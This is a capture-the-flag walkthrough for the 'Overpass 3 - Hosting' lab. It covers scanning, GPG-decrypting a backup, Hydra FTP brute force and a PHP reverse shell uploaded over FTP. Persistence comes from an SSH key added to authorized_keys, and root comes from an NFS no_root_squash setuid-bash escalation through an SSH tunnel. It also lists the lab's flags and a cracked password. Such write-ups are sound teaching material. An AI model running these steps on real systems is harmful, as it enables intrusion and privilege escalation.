# Overpass 3 - Hosting
## Difficulty: Medium

- Task 1 Overpass3 - Adventures in Hosting
    Start the engine to get the IP Address `10.10.88.229`
    ```bash
    nmap -sC -sV 10.10.88.229 > nmap_scan

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
    | ssh-hostkey:
    |   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
    |   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
    |_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
    80/tcp open  http    Apache httpd 2.4.37 ((centos))
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-title: Overpass Hosting
    |_http-server-header: Apache/2.4.37 (centos)
    Service Info: OS: Unix
    ```
    Scan port 80:
    ```bash
    gobuster dir -u http://10.10.88.229 -w /usr/share/wordlists/dirb/common.txt
    /.hta                 (Status: 403) [Size: 213]
    /.htaccess            (Status: 403) [Size: 218]
    /.htpasswd            (Status: 403) [Size: 218]
    /backups              (Status: 301) [Size: 236] [--> http://10.10.88.229/backups/]
    /cgi-bin/             (Status: 403) [Size: 217]
    /index.html           (Status: 200) [Size: 1770]
    ```
    

    Download file backup.zip and extract using gpg
    
    ```bash
    gpg --import priv.key
    gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
    gpg: key C9AE71AB3180BC08: secret key imported
    gpg: Total number processed: 1
    gpg:              unchanged: 1
    gpg:       secret keys read: 1
    gpg:  secret keys unchanged: 1

    gpg --decrypt-files CustomerDetails.xlsx.gpg
    ```

    create file python to read extracted xlsx file
    ```python
    #!/usr/bin/env python

    import xlrd

    wb=xlrd.open_workbook('CustomerDetails.xlsx')
    ws=wb.sheet_by_name(wb.sheet_names()[0])

    n_rows=ws.nrows
    n_cols=ws.ncols
    for r in range(n_rows):
        for c in range(n_cols):
            print(ws.cell_value(r,c),end="|")

        print('-'*10)
    ```


    brute using Hydra SSH return nothing 
    brute using Hydra FTP `hydra -L user.txt -P pass.txt ftp://10.10.88.229`
    ```bash
    [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
    [DATA] attacking ftp://10.10.88.229:21/
    [21][ftp] host: 10.10.88.229   login: paradox   password: ShibesAreGreat123
    1 of 1 target successfully completed, 1 valid password found
    ```

    got credential `paradox:ShibesAreGreat123`
    login to FTP `ftp paradox@10.10.88.229`

    ```bash
    ftp paradox@10.10.88.229
    ls
    drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
    -rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
    -rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
    -rw-r--r--    1 0        0             576 Nov 17  2020 main.css
    -rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
    ```
    
    trying to put file on FTP and check on Web Server port 80 `put user.txt`
    ```bash
    curl http://10.10.88.229/user.txt
    paradox
    0day
    muirlandoracle
    ```
    
    trying to put reverse_shell
    ```bash
    put rev.php
    ```

    after get reverse shell stabilize our shelll using python3
    ```bash
    python3 -c "import pty;pty.spawn('/bin/bash')"
    stty echo -raw;fg
    export TERM=xterm-256color


    cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
    systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
    tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
    polkitd:x:998:996:User for polkitd:/:/sbin/nologin
    sssd:x:997:994:User for sssd:/:/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    chrony:x:996:993::/var/lib/chrony:/sbin/nologin
    rngd:x:995:992:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
    james:x:1000:1000:James:/home/james:/bin/bash
    rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
    rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
    apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
    nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
    paradox:x:1001:1001::/home/paradox:/bin/bash
    ```

    got user `paradox,james,root`
    
    ### Priviledge Escalation
    change user to paradox using `su paradox`

    create a persistent connection generate rsa.pub and add to authorized_keys on server 
    ```bash
    ssh-keygen -f paradox
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in paradox
    Your public key has been saved in paradox.pub
    The key fingerprint is:
    SHA256:aWohZcNz/+0EcrVIKYYG1E4dE3ygzWjVg6H7tcwCeFM lodwig@kali
    The key's randomart image is:
    +---[RSA 3072]----+
    |     .o. oBB     |
    |     . .oO+.+.   |
    |      *oO E.o..  |
    |     o B.* o o . |
    |    . o S o = .  |
    |     . = + B +   |
    |      o   o = o  |
    |     .     . o   |
    |              .  |
    +----[SHA256]-----+

    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCNnvur0l+/Jk3B8l62R/AvTHrnSPhOB/7TfxyqiVP298J/6kKK5G/jMC8WaPlmUNqMHSMGNZEnTWh41HDbP0yYDXfymvObbbNIJAkz8dfY4zOOFNcF1IOCD50LIXUFpVP4xiwpaBpQ9oi41ySA3Uns8wbapORsPjoq/q71jNRwIFOCqrxpOjl200w6ILgYAYEHkOBS+CfX1TzJb4PPBv+Oz7yDYtuwr5FS7J3yM/MiGgn28A9JiFmHrS3kMzsfOgOgnPKLcfpM7drSFS6VjMcNkxnrnLXzpYMVV9dwJzdG9nM0RPyYUU5zEUNBL/Q51833be5Be7WWD4c12YzcmSX3asCNxCDAhCGJNJ2OZE4ZRAFzs0w6O9fkM37mcpnVVycYcV1nmf8x3SQ8hYgdDa6gkDtsG9dHzgyt8/kouVuedeJjyh18Oqj1Bo9AsBU1c9imvGvSd2UWjKscfsL8sTbcQT6rTketZzk3Z+zX9mOq3tq+I+wAic+7nZlaGb3lQVk= lodwig@kali" >> authorized_keys
    
    chmod 600 paradox
    ssh -i paradox paradox@10.10.88.229
    ```

    Upload linpeas and check vulnerability
    Analyzing NFS Exports Files (limit 70)
    ```bash
    -rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
    /home/james *(rw,fsid=0,sync,no_root_squash,insecure)
    ```

    Trying to exploit Network File Sharing using ssh tunneling because on nmap port nfs is closed (not showing but listen on localhost)
    ```bash
    ssh -N -L 2049:localhost:2049 -i paradox paradox@10.10.88.229
    mkdir James
    mount -t nfs localhost:/ ./James

    cp /bin/bash to shared folder on home/james
    chown root:root ./bash
    chmod +s ./bash
    bash -p

    find / -type f -name "*flag" 2>/dev/null
    /root/root.flag
    /usr/share/httpd/web.flag
    /home/james/user.flag
    ```


    - Web Flag
        cat /usr/share/httpd/web.flag `thm{0ae72f7870c3687129f7a824194be09d}`
    - User Flag
        cat /home/james/user.flag `thm{3693fc86661faa21f16ac9508a43e1ae}`
    - Root flag
        cat /root/root.flag `thm{a4f6adb70371a4bceb32988417456c44}`